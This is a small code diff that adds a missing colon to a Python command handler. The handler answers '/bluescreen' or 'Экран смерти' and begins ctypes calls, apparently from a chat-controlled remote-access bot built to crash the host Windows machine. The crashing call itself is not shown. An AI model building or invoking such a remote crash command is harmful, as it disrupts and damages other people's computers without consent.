@@ -143,7 +143,7 @@ def commands(message):
 
 
 
-        elif message.text == '/bluescreen' or message.text == 'Экран смерти'
+        elif message.text == '/bluescreen' or message.text == 'Экран смерти':
                 try:
                     tmp1 = c_bool()
                     tmp2 = DWORD()
